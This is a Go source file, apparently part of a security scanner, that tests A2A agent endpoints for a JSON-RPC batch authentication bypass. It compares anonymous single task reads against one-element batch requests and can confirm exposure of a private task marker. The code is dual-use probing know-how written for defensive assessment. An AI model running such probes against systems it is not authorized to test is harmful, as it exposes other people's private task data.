package a2a

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/calbebop/batesian/internal/attack"
)

// BatchBypassExecutor compares single and batched task reads.
type BatchBypassExecutor struct {
	rule attack.RuleContext
}

func init() {
	attack.Register("a2a-jsonrpc-batch-bypass", func(rc attack.RuleContext) attack.Executor {
		return NewBatchBypassExecutor(rc)
	})
}

func NewBatchBypassExecutor(r attack.RuleContext) *BatchBypassExecutor {
	return &BatchBypassExecutor{rule: r}
}

func (e *BatchBypassExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	ctx = withTenantRouting(ctx)
	vars := attack.NewVars(target, opts.OOBListenerURL)
	// The batch caller is always anonymous, even when an owner token is configured.
	client := attack.NewUnauthHTTPClient(opts, vars)
	endpoint, ok := resolveA2AEndpoint(ctx, client, vars.BaseURL)
	if !ok && opts.A2ABatchProbe != nil {
		endpoint, ok = resolveA2AEndpoint(ctx, attack.NewHTTPClient(opts, vars), vars.BaseURL)
	}
	if !ok {
		return nil, attack.ErrInconclusive
	}
	if opts.A2ABatchProbe != nil {
		return e.probeKnownTask(ctx, endpoint, opts, vars.RandID, client)
	}

	bogusTask := "batesian-nonexistent-" + vars.RandID
	shapes := batchGetShapes(bogusTask, vars.RandID, 1)

	var incomplete []string
	for _, s := range shapes {
		ctrl, err := client.POST(ctx, endpoint, s.headers, s.obj)
		if err != nil || ctrl == nil {
			incomplete = append(incomplete, s.label+" control request failed")
			continue
		}
		requestID, _ := s.obj["id"].(string)
		if ctrl.StatusCode == 408 || ctrl.StatusCode == 429 || ctrl.StatusCode >= 500 {
			incomplete = append(incomplete, s.label+" control response was not judged")
			continue
		}
		if ctrl.IsSuccess() && !a2aSingleAnswered(ctrl.Body, requestID) {
			incomplete = append(incomplete, s.label+" control response was not judged")
			continue
		}
		if !isA2AAuthRejection(ctrl) {
			if ambiguousBatchResponse(ctrl, requestID, false) {
				incomplete = append(incomplete, s.label+" control response was not judged")
			}
			continue
		}
		test, err := client.POST(ctx, endpoint, s.headers, []interface{}{s.obj})
		if err != nil || test == nil {
			incomplete = append(incomplete, s.label+" batch request failed")
			continue
		}
		evidence := batchNoDispatch
		if test.IsSuccess() {
			evidence = a2aBatchDispatched(test.Body, requestID)
		}
		if evidence != batchNoDispatch {
			if len(incomplete) != 0 {
				return e.finding(endpoint, s.label, ctrl, test, evidence, false), fmt.Errorf("%w: %s", attack.ErrInconclusive, strings.Join(incomplete, "; "))
			}
			return e.finding(endpoint, s.label, ctrl, test, evidence, false), nil
		}
		if ambiguousBatchResponse(test, requestID, true) {
			incomplete = append(incomplete, s.label+" batch response was not judged")
		}
	}
	if len(incomplete) != 0 {
		return nil, fmt.Errorf("%w: %s", attack.ErrInconclusive, strings.Join(incomplete, "; "))
	}
	return nil, nil
}

type batchProbeShape struct {
	label   string
	headers map[string]string
	obj     map[string]interface{}
}

// batchGetShapes keeps each single request identical to its batch element.
func batchGetShapes(taskID, randID string, historyLength int) []batchProbeShape {
	return []batchProbeShape{
		{
			label:   "v1.0 GetTask",
			headers: map[string]string{"A2A-Version": "1.0"},
			obj: map[string]interface{}{
				"jsonrpc": "2.0",
				"id":      "batesian-batch-" + randID + "-v1",
				"method":  "GetTask",
				"params":  map[string]interface{}{"id": taskID, "historyLength": historyLength},
			},
		},
		{
			label:   "v0.3 tasks/get",
			headers: nil,
			obj: map[string]interface{}{
				"jsonrpc": "2.0",
				"id":      "batesian-batch-" + randID + "-v03",
				"method":  "tasks/get",
				"params":  map[string]interface{}{"id": taskID, "historyLength": historyLength},
			},
		},
	}
}

func (e *BatchBypassExecutor) probeKnownTask(ctx context.Context, endpoint string, opts attack.Options,
	randID string, anon *attack.HTTPClient) ([]attack.Finding, error) {
	probe := opts.A2ABatchProbe
	if probe.TaskID == "" || len(probe.PrivateMarker) < 16 {
		return nil, fmt.Errorf("%w: a2a_batch_probe needs a task ID and private marker", attack.ErrInconclusive)
	}
	owner := attack.NewHTTPClient(opts, attack.NewVars(endpoint, opts.OOBListenerURL))
	if !owner.PresentsCredential(endpoint) {
		return nil, fmt.Errorf("%w: a2a_batch_probe needs owner credentials", attack.ErrInconclusive)
	}
	var incomplete []string
	var indicator []attack.Finding
	for _, s := range batchGetShapes(probe.TaskID, randID, 10) {
		requestID, _ := s.obj["id"].(string)
		ownerRequest := make(map[string]interface{}, len(s.obj))
		for key, value := range s.obj {
			ownerRequest[key] = value
		}
		ownerRequest["id"] = requestID + "-owner"
		baseline, err := owner.POST(ctx, endpoint, s.headers, ownerRequest)
		if err != nil || baseline == nil || !baseline.IsSuccess() {
			incomplete = append(incomplete, s.label+" owner task read failed")
			continue
		}
		result, _, hasError, valid := discoveryResponse(baseline.Body, requestID+"-owner")
		if !valid || hasError {
			incomplete = append(incomplete, s.label+" owner task read was not verified")
			continue
		}
		location, matched := taskMarkerLocation(result, probe.TaskID, probe.PrivateMarker)
		if location == "" || !matched {
			incomplete = append(incomplete, s.label+" owner task did not contain the private marker")
			continue
		}
		control, err := anon.POST(ctx, endpoint, s.headers, s.obj)
		if err != nil || control == nil || control.StatusCode == 408 || control.StatusCode == 429 || control.StatusCode >= 500 {
			incomplete = append(incomplete, s.label+" anonymous single request failed")
			continue
		}
		denied := control.StatusCode == 401 || control.StatusCode == 403
		singleNotFound := false
		if control.IsSuccess() {
			_, code, hasError, valid := discoveryResponse(control.Body, requestID)
			if !valid {
				incomplete = append(incomplete, s.label+" anonymous single response was not correlated")
				continue
			}
			singleNotFound = hasError && code == -32001 && !errMessageIsAuth(control.Body)
			denied = singleNotFound || hasError && errMessageIsAuth(control.Body)
		}
		if !denied {
			continue
		}
		batch, err := anon.POST(ctx, endpoint, s.headers, []interface{}{s.obj})
		if err != nil || batch == nil {
			incomplete = append(incomplete, s.label+" batch request failed")
			continue
		}
		if !batch.IsSuccess() {
			if ambiguousBatchResponse(batch, requestID, true) {
				incomplete = append(incomplete, s.label+" batch response was not judged")
			}
			continue
		}
		batchLocation, taskMatched := batchTaskMarkerLocation(batch.Body, requestID, probe.TaskID, probe.PrivateMarker)
		if batchLocation != "" && taskMatched {
			finding := e.confirmedFinding(endpoint, s.label, batchLocation, control, batch)
			if len(incomplete) != 0 {
				return finding, fmt.Errorf("%w: %s", attack.ErrInconclusive, strings.Join(incomplete, "; "))
			}
			return finding, nil
		}
		evidence := a2aBatchDispatched(batch.Body, requestID)
		if evidence == batchTaskNotFound && singleNotFound {
			continue
		}
		if evidence == batchTaskReturned && !taskMatched {
			incomplete = append(incomplete, s.label+" batch returned an unrelated task")
			continue
		}
		if evidence != batchNoDispatch {
			if len(indicator) == 0 {
				indicator = e.finding(endpoint, s.label, control, batch, evidence, true)
			}
			continue
		}
		if ambiguousBatchResponse(batch, requestID, true) {
			incomplete = append(incomplete, s.label+" batch response was not judged")
		}
	}
	if len(incomplete) != 0 {
		return indicator, fmt.Errorf("%w: %s", attack.ErrInconclusive, strings.Join(incomplete, "; "))
	}
	return indicator, nil
}

func batchTaskMarkerLocation(body []byte, requestID, taskID, marker string) (string, bool) {
	var replies []json.RawMessage
	if json.Unmarshal(body, &replies) != nil || len(replies) != 1 {
		return "", false
	}
	result, _, hasError, valid := discoveryResponse(replies[0], requestID)
	if !valid || hasError {
		return "", false
	}
	return taskMarkerLocation(result, taskID, marker)
}

func ambiguousBatchResponse(resp *attack.Response, requestID string, batch bool) bool {
	if resp.StatusCode == 408 || resp.StatusCode == 429 || resp.StatusCode >= 500 ||
		resp.StatusCode >= 300 && resp.StatusCode < 400 {
		return true
	}
	if !resp.IsSuccess() {
		return false
	}
	if batch {
		return !a2aBatchRejected(resp.Body, requestID)
	}
	return !a2aSingleAnswered(resp.Body, requestID)
}

func a2aSingleAnswered(body []byte, requestID string) bool {
	_, _, _, valid := discoveryResponse(body, requestID)
	return valid
}

func a2aBatchRejected(body []byte, requestID string) bool {
	type rpcResponse struct {
		JSONRPC string          `json:"jsonrpc"`
		ID      json.RawMessage `json:"id"`
		Error   json.RawMessage `json:"error"`
	}
	var responses []rpcResponse
	if json.Unmarshal(body, &responses) != nil {
		var response rpcResponse
		return json.Unmarshal(body, &response) == nil &&
			a2aRejectedError(response.JSONRPC, response.ID, response.Error, requestID)
	}
	return len(responses) == 1 &&
		a2aRejectedError(responses[0].JSONRPC, responses[0].ID, responses[0].Error, requestID)
}

func a2aRejectedError(version string, rawID, rawError json.RawMessage, requestID string) bool {
	if version != "2.0" {
		return false
	}
	if string(rawID) != "null" {
		var id string
		if json.Unmarshal(rawID, &id) != nil || id != requestID {
			return false
		}
	}
	var rpcErr struct {
		Code    *int    `json:"code"`
		Message *string `json:"message"`
	}
	if json.Unmarshal(rawError, &rpcErr) != nil || rpcErr.Code == nil || rpcErr.Message == nil {
		return false
	}
	return errMessageIsAuthRaw(rawError) || *rpcErr.Code == -32700 ||
		*rpcErr.Code >= -32602 && *rpcErr.Code <= -32600
}

func (e *BatchBypassExecutor) finding(endpoint, shape string, ctrl, test *attack.Response,
	evidence batchDispatchEvidence, knownTask bool) []attack.Finding {
	refusal := "HTTP authentication refusal"
	if ctrl.IsSuccess() && errMessageIsAuth(ctrl.Body) {
		refusal = "correlated JSON-RPC authentication error"
	} else if ctrl.IsSuccess() {
		refusal = "correlated TaskNotFound"
	}
	title := "A2A batch changed the authentication outcome"
	description := fmt.Sprintf(
		"At %s, a single unauthenticated GetTask request was refused, while the same request in a "+
			"one-element batch returned TaskNotFound. A2A also uses TaskNotFound for inaccessible tasks, "+
			"so this difference does not prove unauthorized access. Check that single and batch "+
			"requests receive the same authentication and authorization checks.", endpoint)
	if evidence == batchTaskReturned {
		title = "A2A batch returned a task after single-request denial"
		description = fmt.Sprintf(
			"At %s, a single unauthenticated GetTask request was refused, but the same request "+
				"in a one-element batch returned a task object. The response alone does not establish "+
				"private access. Check authorization on each batch element (CWE-288).", endpoint)
	}
	if knownTask && evidence == batchTaskNotFound {
		description = fmt.Sprintf("At %s, the owner could read a task containing the private marker, but an anonymous single request was denied while the batch returned TaskNotFound. This difference does not establish private content disclosure. Check authorization on each batch element.", endpoint)
	}
	return []attack.Finding{{
		RuleID:      e.rule.ID,
		RuleName:    e.rule.Name,
		Severity:    "medium",
		Confidence:  attack.RiskIndicator,
		Title:       title,
		Description: description,
		Evidence: fmt.Sprintf(
			"endpoint: %s\nshape: %s\nsingle request: HTTP %d (%s)\n"+
				"batch [request]: HTTP %d (%s)\nreply content omitted",
			endpoint, shape, ctrl.StatusCode, refusal, test.StatusCode, evidence),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
	}}
}

func (e *BatchBypassExecutor) confirmedFinding(endpoint, shape, location string,
	ctrl, batch *attack.Response) []attack.Finding {
	return []attack.Finding{{
		RuleID:      e.rule.ID,
		RuleName:    e.rule.Name,
		Severity:    "high",
		Confidence:  attack.ConfirmedExploit,
		Title:       "A2A task content exposed through JSON-RPC batch",
		Description: fmt.Sprintf("At %s, the owner read a known task containing a private marker. An anonymous single request for that task was denied, but the same request in a one-element batch returned the task and marker in its %s. Apply authorization to each batch element (CWE-288).", endpoint, location),
		Evidence:    fmt.Sprintf("endpoint: %s\nshape: %s\nowner task and private marker: verified\nsingle request: HTTP %d (denied)\nbatch request: HTTP %d (task and marker matched)\nreply content omitted", endpoint, shape, ctrl.StatusCode, batch.StatusCode),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
	}}
}

// isA2AAuthRejection accepts HTTP 401/403 or an auth error on a successful response.
func isA2AAuthRejection(resp *attack.Response) bool {
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return true
	}
	return resp.IsSuccess() && errMessageIsAuth(resp.Body)
}

type batchDispatchEvidence string

const (
	batchNoDispatch   batchDispatchEvidence = ""
	batchTaskNotFound batchDispatchEvidence = "TaskNotFound"
	batchTaskReturned batchDispatchEvidence = "task returned"
)

// a2aBatchDispatched requires a response correlated to the task probe.
func a2aBatchDispatched(body []byte, expectedID string) batchDispatchEvidence {
	var arr []struct {
		JSONRPC string          `json:"jsonrpc"`
		ID      json.RawMessage `json:"id"`
		Result  json.RawMessage `json:"result"`
		Error   json.RawMessage `json:"error"`
	}
	if err := json.Unmarshal(body, &arr); err != nil || len(arr) != 1 {
		return batchNoDispatch
	}
	for _, el := range arr {
		var responseID string
		if el.JSONRPC != "2.0" || json.Unmarshal(el.ID, &responseID) != nil || responseID != expectedID {
			continue
		}
		if len(el.Result) != 0 && string(el.Result) != "null" && len(el.Error) == 0 {
			if _, taskID, _ := validatedTaskResult(el.Result); taskID != "" {
				return batchTaskReturned
			}
		}
		var responseError struct {
			Code    *int    `json:"code"`
			Message *string `json:"message"`
		}
		if len(el.Result) == 0 && json.Unmarshal(el.Error, &responseError) == nil &&
			responseError.Code != nil && *responseError.Code == -32001 && responseError.Message != nil &&
			!errMessageIsAuthRaw(el.Error) {
			return batchTaskNotFound
		}
	}
	return batchNoDispatch
}

func errMessageIsAuth(body []byte) bool {
	var obj struct {
		Error json.RawMessage `json:"error"`
	}
	if err := json.Unmarshal(body, &obj); err != nil || len(obj.Error) == 0 {
		return false
	}
	return errMessageIsAuthRaw(obj.Error)
}

func errMessageIsAuthRaw(rawErr json.RawMessage) bool {
	var e struct {
		Message string `json:"message"`
	}
	if err := json.Unmarshal(rawErr, &e); err != nil {
		return false
	}
	// A2A has no numeric auth error code; use the shared message vocabulary.
	return attack.AuthFlavoredMessage(e.Message)
}
